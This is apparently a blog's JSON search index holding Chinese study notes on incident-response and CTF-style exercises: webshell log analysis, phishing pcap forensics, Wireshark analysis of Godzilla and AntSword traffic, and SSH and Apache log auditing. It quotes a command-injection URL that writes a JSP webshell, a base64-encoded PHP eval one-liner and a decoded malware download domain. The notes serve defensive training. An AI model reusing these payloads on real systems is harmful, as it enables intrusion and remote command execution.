这是典型的JSP WebShell模板，攻击者可以通过访问：\nbash复制编辑http://目标服务器/ping.jsp?cmd=whoami\n\n来执行命令，如 whoami、ipconfig、netstat，获取服务器信息。\n\n使用 命令注入 &amp;&amp; echo ... &gt; C:，构造请求：\nbash复制编辑http://victim.com/connect/ping.jsp?ip=8.8.8.8 &amp;&amp; echo &lt;恶意代码&gt; &gt; C:\\路径\\ping.jsp\n\n如果服务端未过滤参数，攻击者可能成功将 JSP WebShell 写入磁盘。\n然后攻击者访问这个 JSP 页面，通过参数 cmd 执行任意命令\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件","url":"/2025/09/16/%E7%8E%84%E6%9C%BA%E2%80%94%E2%80%94%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/","content":"玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件1. 下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx&#x2F;w0ks&#x2F;&#x2F;?YO&#x3D;xxxxxxx}） (无需 http、https)；步骤分析：如何分析数据包文件？\n\n过滤 HTTP&#x2F;HTTPS 流量\n\n根据题目知道，黑客是获取了 zip 压缩包，在 Wireshark 中，恶意程序通常通过 HTTP 或 HTTPS 协议访问 URL 以下载文件（如 zip 压缩包）\n我们可以使用使用过滤器：http 或 tls（如果 HTTPS）来筛选相关流量\n\n\n查找文件下载请求\n\n恶意程序下载 zip 压缩包时，通常会发送 HTTP GET 或 POST 请求。在 Wireshark 中：\n查找包含 .zip 扩展名的请求（例如，过滤 http.re quest.uri contains &quot;.zip&quot;）\n或查找响应中包含 Content-Type: application/zip 或类似内容的包\n内嵌 URL 可能出现在请求的 URI（Uniform Resource Identifier）中，例如路径和查询参数\n\n\n\n\n\n我们这里使用http.request.uri contains &quot;.zip&quot;搜索没有数据包，无奈只能用http了\n\n过滤http，按照大小排序，追踪http流\n\n在数据包的下面，就看到了zip压缩包的文件头pk\n\n一旦找到相关 HTTP 请求，检查 Host 头部和请求 URI 以构建完整 URL所以在这里flag是\nflag&#123;tsdandassociates.co.sz/w0ks//?YO=1702920835&#125;\n\n\n\n2.下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；我们这里直接菜单栏中 -&gt; 统计 -&gt; 协议分节统计\n\n选中右键选中\n\n直接定位到我们上题的数据包\n\n右键导出分组字节流后缀注意改为zip，文件解压出来就是这样\n\n直接在当然目录打开cmd，对文件进行md5加密\ncertutil -hashfile 文件名 MD5\n\n\nflag&#123;f17dc5b1c30c512137e62993d1df9b2f&#125;\n\n\n\n​\t\n3.下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)讲另外一个文件打开\n\n把这里面没有被注释的内容总结一下有\no457607380 = &#x27;&#x27;;o457607380+=&#x27;h&#x27;;o457607380+=&#x27;t&#x27;;o457607380+=&#x27;t&#x27;;o457607380+=&#x27;p&#x27;;o457607380+=&#x27;s&#x27;;o457607380+=&#x27;:&#x27;;o457607380+=&#x27;/&#x27;;o457607380+=&#x27;/&#x27;;o457607380+=&#x27;s&#x27;;o457607380+=&#x27;h&#x27;;o457607380+=&#x27;a&#x27;;o457607380+=&#x27;k&#x27;;o457607380+=&#x27;y&#x27;;o457607380+=&#x27;a&#x27;;o457607380+=&#x27;s&#x27;;o457607380+=&#x27;t&#x27;;o457607380+=&#x27;a&#x27;;o457607380+=&#x27;t&#x27;;o457607380+=&#x27;u&#x27;;o457607380+=&#x27;e&#x27;;o457607380+=&#x27;s&#x27;;o457607380+=&#x27;t&#x27;;o457607380+=&#x27;r&#x27;;o457607380+=&#x27;a&#x27;;o457607380+=&#x27;d&#x27;;o457607380+=&#x27;e&#x27;;o457607380+=&#x27;.&#x27;;o457607380+=&#x27;c&#x27;;o457607380+=&#x27;o&#x27;;o457607380+=&#x27;m&#x27;;o457607380+=&#x27;/&#x27;;o457607380+=&#x27;A&#x27;;o457607380+=&#x27;6&#x27;;o457607380+=&#x27;F&#x27;;o457607380+=&#x27;/&#x27;;o457607380+=&#x27;6&#x27;;o457607380+=&#x27;1&#x27;;o457607380+=&#x27;6&#x27;;o457607380+=&#x27;2&#x27;;o457607380+=&#x27;3&#x27;;o457607380+=&#x27;1&#x27;;o457607380+=&#x27;6&#x27;;o457607380+=&#x27;0&#x27;;o457607380+=&#x27;3&#x27;;l988241708 = &#x27;&#x27;;l988241708+=&#x27;q&#x27;;l988241708+=&#x27;u&#x27;;l988241708+=&#x27;i&#x27;;l988241708+=&#x27;.&#x27;;l988241708+=&#x27;q&#x27;;console.log(o457607380, l988241708);\n\n\n字符串拼接构建URL：\n变量 o457607380 初始化为空字符串 &#39;&#39;。\n通过连续34次 += 操作，逐步拼接字符，最终形成完整的URL字符串：&quot;[https://shakyastatue.com/A6F/616231603 ](https://shakyastatue.com/A6F/616231603 )&quot;此过程通过逐个追加字符（如 &#39;h&#39;、&#39;t&#39;、&#39;t&#39;、&#39;p&#39; 等）完成 。\n\n\n字符串拼接构建文件名：\n变量 l988241708 同样初始化为空字符串 &#39;&#39;。\n通过5次 += 操作，拼接出字符串 &quot;qui.q&quot;。此操作逻辑与URL拼接一致，属于基础字符串赋值操作 。\n\n\n控制台输出结果：\n使用 console.log(o457607380, l988241708) 将两个拼接后的字符串同时输出到控制台。console.log 的作用是调试输出，此处会打印完整的URL和文件名 。\n\n\n\n该代码通过逐步拼接字符生成URL和文件名，并输出到控制台，属于基础的字符串操作与调试输出 。完整输出结果为两个字符串的组合，可用于调试或进一步处理\n\nhttps://shakyastatuestrade.com/A6F/616231603 qui.q\n\n得到一个url链接\nflag&#123;shakyastatuestrade.com&#125;\n\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"流量分析","url":"/2025/09/16/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"h流量分析Ann-wireshark-001\n\n流量包中最主要的渗透测试操作是什么？\n使用的端口扫描方式是什么？\n发起扫描的主机的ip是多少？\n扫描到了哪些端口？\n被扫描的主机的apache版本是多少？\n\n\n流量包中最主要的渗透测试操作是什么？\n\n 在流量包（例如 .pcap 文件）中分析“最主要的渗透测试操作”通常指的是识别攻击者在渗透过程中实施的关键行为\n\n1. 信息收集（Reconnaissance）\n这是渗透测试的第一步，也是网络中最容易被检测到的行为之一：\n\n主机扫描（Ping Sweep）\n端口扫描（TCP SYN、TCP Connect、UDP）\n工具：Nmap、Masscan\n\n\n操作系统探测\nTTL、窗口大小等特征分析\n\n\n服务版本探测\n如 GET / HTTP/1.0\\r\\n\\r\\n 请求抓取服务器 banner\n\n\n\n🛠 典型特征：\n\n多目标、多个端口短时间内被访问\nSYN 包密集发送，无完整握手\n\n\n🧪 2. 漏洞利用（Exploitation）\n攻击者利用已知漏洞或弱点攻击目标系统：\n\nWeb 攻击\nSQL 注入：id=1&#39; or &#39;1&#39;=&#39;1\nXSS、LFI、RFI\n文件上传绕过\n\n\nShellshock、Log4j 等漏洞利用\n缓冲区溢出（在二进制协议或服务中）\nMS17-010、EternalBlue等漏洞包\n\n🛠 典型特征：\n\n请求中带有明显 payload\n出现 cmd.exe, bash, /bin/sh、../../ 等关键字\n返回包中有回显，如：uid=0(root) gid=0(root) groups=0(root)\n\n\n📡 3. 会话控制 &#x2F; 权限维持\n获取 shell 并维持对目标控制：\n\n反弹 shell\nTCP 会话连接至攻击者主机（比如目标主机主动访问某个高位端口）\n\n\nMeterpreter、Cobalt Strike 会话\nBeacon通信\n\n🛠 典型特征：\n\n出站连接，目标主机主动连接外部 IP（非常规端口）\n通信数据呈现固定间隔，包小且有规律（C2 通信）\n\n🔐 4. 凭证窃取 &#x2F; 枚举\n攻击者尝试获得敏感信息：\n\nSMB 枚举、NTLM 抓包\nFTP、POP3、IMAP 明文传输密码\nMitM 攻击拦截 HTTP、Telnet、FTP等明文协议\n\n🛠 典型特征：\n\n包含用户名密码字段（如 USER admin, PASS 123456）\nARP 欺骗 + 重复 MAC 地址响应\n\n\n📤 5. 数据回传 &#x2F; 文件上传下载\n攻击者在提权或获取信息后尝试回传数据：\n\n文件 exfiltration（数据泄露）\n下载工具上传工具（如 nc.exe, mimikatz.exe）\n\n🛠 典型特征：\n\nHTTP&#x2F;FTP POST 请求携带大量数据\n使用非常规 HTTP 方法（如 PUT）\n\n流量包中最主要的渗透测试操作是什么？\n\n\n\n操作类型\n流量特征关键词\n\n\n\n端口扫描\n大量 SYN，多个端口\n\n\n漏洞利用\npayload 特征，异常 URL、命令行语句\n\n\nShell 反弹\n出站 TCP 连接\n\n\nC2 通信\n周期小数据包、TLS、DNS 隧道\n\n\n密码抓取\n明文密码字段、NTLM challenge\n\n\n数据泄露\nFTP&#x2F;HTTP PUT、POST 大量数据\n\n\nTCP三次握手的过程如下：SYN: 客户端发送一个SYN报文来请求建立连接。SYN-ACK: 服务器收到请求后，发送一个SYN-ACK报文表示同意连接。ACK: 客户端收到服务器的SYN-ACK报文后，发送一个ACK报文以确认连接。[RST] 表示重置连接的请求，通常用于终止一个连接\n\n\n使用显示过滤器查找 SYN 扫描\n\n在 Wireshark 的 Display Filter（显示过滤器）输入：\n\ntcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 \n//这个 TCP 包设置了 SYN 标志位（同步标志）\n//这个 TCP 包没有设置 ACK 标志位\n     * 同一源 IP 向多个目的端口发送 SYN 包，目标 IP 不变或变化不大，只显示发起三次握手的第一个 SYN 报文（未带 ACK），一般是扫描行为第一步。       * 某一个源 IP（如攻击者机器）       * 短时间向多个端口或多个 IP 发出 SYN 请求     * ![image-20250623200138369](/img/image-20250623200138369.png)2. 并没有什么有用的信息，我们尝试着搜索使用的工具   * `tcp contains &quot;nmap&quot;`      * contains是 Wireshark 的一个**模糊匹配运算符**，意思是“包的载荷中包含”   * 端口扫描-扫描工具nmap     * ![image-20250623200417019](/img/image-20250623200417019.png)**使用的端口扫描方式是什么？**1. **主要扫描方式：TCP SYN扫描（-sS）**在Wireshark中观察到大量`tcp.flags.syn == 1 and tcp.flags.ack == 0`的数据包（仅SYN标志），且开放端口有SYN/ACK响应，关闭端口有RST响应    * &gt; 这是Nmap的**默认扫描方式**（需root权限）。攻击机向目标端口发送SYN包，若端口开放则目标回复SYN/ACK，攻击机随即发送RST终止连接（不完成三次握手）；若端口关闭则目标回复RST/ACK。此方式隐蔽性强且速度快，不会建立完整连接2. 在Wireshark的过滤器中输入 `tcp.flags.reset == 1`，查看是否有RST响应。   * ![image-20250624091454950](/img/image-20250624091454950.png)   * ![image-20250624092535819](/img/image-20250624092535819.png)**发起扫描的主机的ip是多少？**1. 从上面图片可知攻击者的ip是192.168.0.4看谁扫了谁，hack去扫，那就过滤hack的源ip**扫描到了哪些端口？** 1. 使用命令`ip.src == 192.168.0.2 &amp;&amp; tcp.flags.syn ==1 &amp;&amp; tcp.flags.ack ==1`2. 在统计 --&gt; 端点 --&gt;TCP查看   * ![image-20250624093941683](/img/image-20250624093941683.png)   * ![image-20250624094425837](/img/image-20250624094425837.png)**被扫描的主机的apache版本是多少？**1. 在过滤框面搜索`http` 拿到相关协议的流量包 在应用层可以看到 被扫描主机的apache是2.4.23   * ![image-20250624180117915](/img/image-20250624180117915.png)   * ![image-20250624172716501](/img/image-20250624172716501.png)## Ann-wireshark-002**找到flag**&gt; 提示：哥斯拉AES流量1. 我们根据寻找“哥斯拉（Godzilla）”木马流量，需结合其流量特征进行针对性分析 以下是哥斯拉流量包的强特征   * 流量中可见`eval`、`base64_decode`、`strrev`等函数   * 第一个请求总会发送大量数据，这是配置信息，且请求包内无 cookie，服务器响应包无内容，生成一个 session，后续请求会带上此session 到请求包中的 cookie中3、强特征:生成的 cookie 后面有个分号   * Accept:     text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*     /*;q=0.8   * Accept-Language :     zh-CN,zh;q=0.8,zh-Tw;q=0.7,zh-HK;q=0.5,en-Us;q=0.3,en;q=0.22. 哥斯拉的协议依赖：HTTP 是攻击流量的主要载体 哥斯拉的 webshell 工作原理要求其通信必须通过 HTTP 协议实现   * **过滤HTTP POST请求**     * ```       http.request.method == &quot;POST&quot;  # 哥斯拉所有操作均通过POST传输加密数据 \n\n\n\n\n大量的POST请求被发送到同一个URL（/shell.jsp），这可能是尝试利用Web应用程序中的漏洞，例如上传恶意文件或执行命令\n\n\n\n\n\n我们这里对/shell.jsp文件进行过滤查看有没有什么问题\n\nhttp.request.uri contains &quot;test.jsp&quot;\n   * ![image-20250624191202758](/img/image-20250624191202758.png)     4. 根据流量包的信息可以看到攻击者对网站进行了命令执行的操作，根据哥斯拉的流量特征，第一个请求总会发送大量数据，这是配置信息。我们对长度为1129的流量进行追踪流    * 在这里看到了md5加密 拿到网站进行解密即可得到flag   * ![image-20250624191529383](/img/image-20250624191529383.png)## Ann-wireshark-003 **黑客使用什么漏洞拿下root权限的？**1. 观察流量，可以看到前面的请求均为/helloworld/xx，服务器返回404，推测是暴破流量   * ![image-20250625204129244](/img/image-20250625204129244.png)2. 在最后的部分出现了shell.jsp，于是我们向上查看最后一次/helloworld/greeting的流量。   * ![image-20250625204815906](/img/image-20250625204815906.png)3. 追踪http数据流，可以看到[请求体](https://so.csdn.net/so/search?q=请求体&amp;spm=1001.2101.3001.7020)为一个网页   * ![image-20250625204852374](/img/image-20250625204852374.png)4. 搜索标题Reznok’s Hello World Spring Application，得到网页https://github.com/reznok/Spring4Shell-POC，其中记录[漏洞编号](https://so.csdn.net/so/search?q=漏洞编号&amp;spm=1001.2101.3001.7020)为CVE-2022-22965   * ![image-20250625204951488](/img/image-20250625204951488.png)## Ann-wireshark-004题目：1. 连接蚁剑的正确密码是？2. 攻击者存留的值是？格式：`xxx-xxx-xxx-xxx`3. 攻击者下载到的flag是？格式：flag3&#123;xxx&#125;1. 首先要清楚蚁剑的流量特征 蚁剑的流量包采用`post`方式提交    * ```     http &amp;&amp; http.request.method==POST &amp;&amp; http contains &quot;.php&quot;\n\n* 追踪流查看-蚁剑密码**6ea280898e404bfabd0ebb702327b19f**\n\n\n\n\n\n\n攻击者存留的值是？格式：xxx-xxx-xxx-xxx\n\n什么是攻击者的预留值？\n\n定义：该值是攻击者在入侵目标系统后，通过工具（如蚁剑、WebShell）或配置文件（如hacker.txt）中写入的唯一标识符，可能用于后续的权限维持、会话跟踪或数据加密。\n作用：作为攻击者与目标系统交互的“密钥”，可能关联到内存马、后门程序或加密通信的密钥。\n\n\n如何确定攻击者留存的值？\n\n使用Wireshark过滤蚁剑流量（如http或tcp协议），追踪相关TCP流\n\n通过Base64解码或URL解码提取数据包中的字符串\n\n留存是应该是写入的动作，所以一个接一个的流量包翻找就行了，并且只需要配合URL解码和Base64就能看到全文\n\n\n\n\n\n\n攻击者下载到的flag是？格式：flag3{xxx}\n\n追踪TCP流，发现开头是MZ，明显是个EXE文件\n\n复制出来粘贴winhex里\n\n这里响应头给他去掉，保存运行\n\n在桌面生成了张图片，查看下，更改长宽\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAnn-wireshark-005题目：\n服务器自带的后门文件名是什么？（含文件后缀）\n服务器的内网IP是多少？\n攻击者往服务器中写入的key(key.txt)是什么？\n\n服务器自带的后门文件名是什么？（含文件后缀）\n\n通过时间，筛选最早的.php文件http &amp;&amp; http.request.method ==&quot;POST&quot; &amp;&amp; http contains &quot;.php&quot;\n\n追踪最早的那个数据包 打开发现\n代码片段是攻击者利用 file_put_contents 和 base64_decode 将恶意代码写入 d00r.php，实现远程代码执行的典型攻击方式\n**base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D&#39;)**将Base64编码的字符串解码为原始数据\n\n\n\n所以这才是服务器自带的后门文件名ViewMore.php\n\n\n\n\n\n\n服务器的内网IP是多少？\n\n翻找流量包的时候发现在这里执行了一条ipconfig\n\n\n查看响应包发现服务器上有两块网卡 根据流量包分析和的原地址和目的地址分析 162和黑客处于同一网段那么192.168.101.132就是服务器ip地址了\nens33：总收发流量接近 400MB，但这不代表它在处理 你这次请求\nens38：流量很小，仅几十 KB，但它正好对得上你执行一句话木马所造成的那一点点 POST + 响应流量！\n\n\n\n\n\n攻击者往服务器中写入的key(key.txt)是什么？\n\n上面攻击者利用 file_put_contents 和 base64_decode 将恶意代码写入 d00r.php 我们继续查看这条流量包还写入了什么恶意代码\n\n\n\n\n\n继续往下翻 在下面查看到了file_put_contents 写入的恶意代码\n\n对这段进行url -&gt; base64解码 发现ZIP文件的头部通常是PK（即50 4B在十六进制中）\n将解码后的数据复制到一个文本编辑器中\n\n\n\n\nAnn-wireshark-006题目：\n\nadmIn用户的密码是什么？\n\napp.config[&#39;SECRET_KEY&#39;]值为多少？\n\nflask网站由哪个用户启动\n\n攻击者写入的内存马的路由名叫什么？\n\nadmIn用户的密码是什么？\n\n\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"第一章 应急响应-Linux日志分析","url":"/2025/09/16/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","content":"第一章 应急响应-Linux日志分析\n\nhttps://threatbook.cn/next/product/sandbox)\n\n\n\n\n账号root密码linuxrzssh root@IP1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割4.登陆成功的IP共爆破了多少次5.黑客登陆主机后新建了一个后门用户，用户名是多少\n一、查找爆破 SSH 服务的 IP\n第一个 Flag 的目标是查找爆破 SSH 服务 Root 账户的 IP，故这里我们需要分析 auth 日志，auth 日志常见于 Debian 系（这台靶机就是 Debian）\n\n\n\n\n\n此外，Linux 下还有这些日志\n\n![linux log](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\linux log.jpg)\n\n\n\n这里 auth 日志有两条，分别是auth.log和auth.log.1，我们的判断基础是这两个文件，其次这里我们需要判断出哪些爆破的是 Root 账号，所以需要搜索 “Failed password for root”\n\ncat auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more\n* ![image-20250619140818638](/img/image-20250619140818638.png)* ```  命令分析：    cat auth.log.1:    cat 命令用于显示 auth.log.1 文件的内容。  这里 auth.log.1 是一个日志文件，通常是系统日志的备份文件。  |:    管道符号，用于将前一个命令的输出作为下一个命令的输入。  grep -a &quot;Failed password for root&quot;:    grep 命令用于在输入中搜索包含特定模式的行。  -a 选项表示将文件内容视为文本文件（此选项通常在处理二进制文件时使用，但对于纯文本文件，可以省略）。  &quot;Failed password for root&quot; 是搜索模式，即查找所有包含&quot;Failed password for root&quot;的行，这些行表示尝试登录root用户的失败尝试。  awk &#x27;&#123;print $11&#125;&#x27;:    awk 是一个文本处理工具，用于按字段处理文本。  &#123;print $11&#125; 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。  sort:    sort 命令用于对输入行进行排序。  这里是对提取的IP地址进行排序。  uniq -c:    uniq 命令用于删除重复的行。  -c 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。  sort -nr:    sort 命令再次用于排序。  -n 选项表示按数值进行排序。  -r 选项表示按降序排序。  组合起来，即按出现次数从高到低排序。  more:    more 命令用于分页显示输出。  由于输出可能很长，more 命令允许用户逐页查看结果。  总结    这条命令的具体功能如下：    从 auth.log.1 文件中筛选出所有尝试登录root用户失败的条目。  提取这些条目中的IP地址（假设IP地址是日志行中的第11个字段）。  对IP地址进行排序和去重，并统计每个IP地址的尝试次数。  将结果按尝试次数降序排序，并分页显示。\n\n\n\n\n按照从大到小的顺序排序 Flag，最终 Flag 为192.168.200.2,192.168.200.31,192.168.200.32，提交记得加上 Flag 格式\n\n\n二、SSH 爆破成功登陆的IP是多少，如果有多个使用”,”分割\n第二个 Flag 是需要寻找爆破成功的 IP，依然是搜索 auth 日志，当 SSH 登录成功时，会回显Accepted，所以我们在日志文件中匹配这个关键词\n\ncat auth.log.1 auth.log| grep -a &quot;Accepted&quot; |awk &#39;&#123;print$11&#125;&#39; | sort | uniq -c | sort -nr |more\n   * ![image-20250619141417424](/img/image-20250619141417424.png)2. 匹配到一个IP成功登录SSH的，提交注意flag格式#### **三、爆破用户名字典是什么？**1. 第三个 Flag 要求我们找到爆破时使用的**用户名**字典，也就是说找到 SSH 尝试登录过哪些用户名，`perl`命令接受了`grep`的查询结果，之后匹配 “for” 和 “from” 之间的任何字符（用户名），最终 Flag 拼接后为`user,hello,root,test3,test2,test1`   * ```     cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for (.*?) from/; print &quot;$1\\n&quot;; &#125;&#x27; | uniq -c | sort -nr\n\n\n命令作用逐段分析：\n1️⃣ cat /var/log/auth.log.1 /var/log/auth.log\n合并当前和历史的 SSH 登录日志文件\n\n通常 /var/log/auth.log 记录的是 SSH 登录/失败/验证信息\n\n.1 是上一个轮转的旧日志\n\n2️⃣ grep -a &quot;Failed password&quot;\n过滤出登录失败的日志行\n\n如：\n\nnginx\n复制\n编辑\nFailed password for root from 192.168.1.100 port 3456 ssh2\n3️⃣ perl -e &#39;while($_=&lt;&gt;)&#123; /for (.*?) from/; print &quot;$1\\n&quot;; &#125;&#39;\n用 Perl 正则提取出尝试登录失败的 用户名\n\n正则 /for (.*?) from/ 匹配：\n\nfor root from 1.2.3.4 → 捕获 root\n\n输出所有用户名（每个一行）\n\n4️⃣ uniq -c\n统计每个用户名出现的次数\n\n例如：\n\nbash\n复制\n编辑\n    15 root\n    3 admin\n    2 test\n5️⃣ sort -nr\n将这些用户名按照失败次数从大到小排序\n   #### **四、成功登录 root 用户的 ip 一共爆破了多少次**1. 查找刚刚那个成功   * ```      cat auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more\n\n\n\n\n\n\n\n五、黑客登陆主机后新建了一个后门用户，用户名是多少\n继续对 auth 日志进行审计，查找创建新用户的行为\n\n使用 grep 命令搜索与创建用户相关的关键字，如 new user。这样可以找到所有新建用户的日志条目。\n\ncat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;new user&quot;\n\n\n\n\n\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"日志分析-ssh日志分析","url":"/2025/09/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-ssh%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","content":"日志分析-ssh日志分析题目：\n    1、可以登录 SSH 的账号数量是多少\n\n    2、SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次）\n\n    3、SSH日志中登录成功次数最多的用户的用户名是什么\n\n    4、SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag&#123;用户名,ip&#125;)\n\n1、可以登录 SSH 的账号数量是多少这里直接查看ssh的服务配置文件/etc/ssh/sshd_config 是 SSH 服务端配置文件，用于控制 SSH 服务（sshd）的各种行为。\ncat /etc/ssh/sshd_config \n\n\nAllowGroups SSHD_USER root：表示只有属于 SSHD_USER 组或 root 用户所在组的用户才可以登录 SSH。\n其它用户 无论是否存在 shell，也无法登录 SSH，除非属于上面两个组之一\n下一步我们查看所属组的用户\ncat /etc/group\n\n\n可以看到只有两个用户属于SSHD_USER组一个是toor 另一个是root\n所以flag{2}\n常见配置项解释\n\n\n\n配置项\n作用\n\n\n\nPort 22\nSSH监听端口，默认是22\n\n\nPermitRootLogin no\n禁止root用户通过SSH登录\n\n\nPasswordAuthentication yes\n允许使用密码登录\n\n\nPubkeyAuthentication yes\n允许使用公钥认证登录\n\n\nAllowUsers user1 user2\n仅允许这些用户SSH登录\n\n\nDenyUsers baduser\n拒绝这些用户SSH登录\n\n\nPermitEmptyPasswords no\n不允许空密码登录\n\n\n举个例子\n你看到配置：\nnginx复制编辑PermitRootLogin noAllowUsers alice bob\n\n意思是：\n\nroot 用户不能登录\n只有 alice 和 bob 可以通过 SSH 登录服务器\n\n2、SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次）进入日志，这里要讲要将 auth.log.2.gz 解压缩后才可以做题\n\n\n根据题目说登录成功，我们首先就可以想到筛选当 SSH 登录成功时，会回显Accepted，所以我们在日志文件中匹配这个关键词，\ngrep &quot;Accepted&quot; auth.log.1 auth.log.2 | wc -l\n\n\n这里正确答案应该是103\n这里显示110可能是因为我前面多登录了几次\n3、SSH日志中登录成功次数最多的用户的用户名是什么这里跟上题目差不多，只不过加了个用户名的条件,拿到flag{toor}\ngrep &quot;Accepted&quot; auth.log.1 auth.log.2 | awk &#x27;&#123;print $9&#125;&#x27; | sort | uniq -c | sort -nr\n\n\n4、SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag{用户名,ip})这里我们对日志里面的 登录失败 ip 进行针对性筛选\ncat auth.log.1 auth.log.2 | grep &quot;Failed password&quot;  | awk &#x27;&#123;print $9,$11&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10\n\n\n可以看到登录失败最多的用户是root拿到flag{root,87.163.111.11}\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"第一章日志分析-apache日志分析","url":"/2025/09/16/%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","content":"第一章日志分析-apache日志分析1、提交当天访问次数最多的IP，即黑客IP：2、黑客使用的浏览器指纹是什么，提交指纹的md5：3、查看包含index.php页面被访问的次数，提交次数：4、查看黑客IP访问了多少次，提交次数：5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n\n1、提交当天访问次数最多的IP，即黑客IP：*已知中间件是Linux上的Apache，常见日志路径一般是：\n\n&#x2F;var&#x2F;log&#x2F;apache&#x2F;\n&#x2F;var&#x2F;log&#x2F;apache2&#x2F;\n&#x2F;var&#x2F;log&#x2F;httpd&#x2F;\n\n通过命令 ls -lah 查看文件大小 判断日志文件是 access.log\n\n使用命令 cat access.log.1 | awk ‘{print $1}’ | sort |uniq -c | sort -nr 判断访问次数最多的IP地址是：192.168.200.2。\n\nawk 从 access.log 文件中提取每行的第一个字段（即客户端的 IP 地址）。在 Apache 日志中，IP 地址通常是每行的第一个字段\n\n\n2、黑客使用的浏览器指纹是什么，提交指纹的md5：使用命令cat access.log.1 | grep 192.168.200.2 | awk -F’”‘ ‘{print $6}’ access.log.1 | sort |uniq -c | sort -nr\n\n-F&#39;&quot;&#39;：这个选项告诉 awk 使用双引号（&quot;）作为字段分隔符。Apache 日志中的 User-Agent 字符串通常是被双引号括起来的（例如 &quot;Mozilla/5.0 ...&quot;），因此我们可以使用双引号来分隔字段。\n\n&#123;print $6&#125;：从分隔后的字段中打印出第 6 个字段，这通常是 User-Agent 字段\n\n\n其中次数最多的是：Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36。\n\n我们指纹进行md5计算，得到：2d6330f380f44ac20f3a02eed0958f66\necho -n &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot; | md5sum\n\n\n需要注意的是，echo命令默认情况下会在输出的文本末尾自动添加换行符，这会影响md5值的计算结果，因此echo命令需要带上-n参数，禁止输出换行符，否则计算出的md5值是错误的\n\n\n3、查看包含index.php页面被访问的次数，提交次数：(不包括&#x2F;xxx&#x2F;index.php只筛选&#x2F;index.php)使用命令cat access.log.1 | grep &#39;/index.php&#39;计算访问页面、访问页面来源页面（Referer）含有&#x2F;index.php的次数（grep的&#x2F;index.php前面都没空格），是27次\n\n4、查看黑客IP访问了多少次，提交次数：在第一题时，得知黑客IP地址是：192.168.200.2 因此访问次数是：6555\n\n5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数使用命令查看grep ‘03&#x2F;Aug&#x2F;2023:08’ access.log.1 | awk ‘{print $1}’ | sort | uniq -c | sort -nr \n数量为5个\n\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"第一章 应急响应-webshell查杀","url":"/2025/09/16/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/","content":"第一章 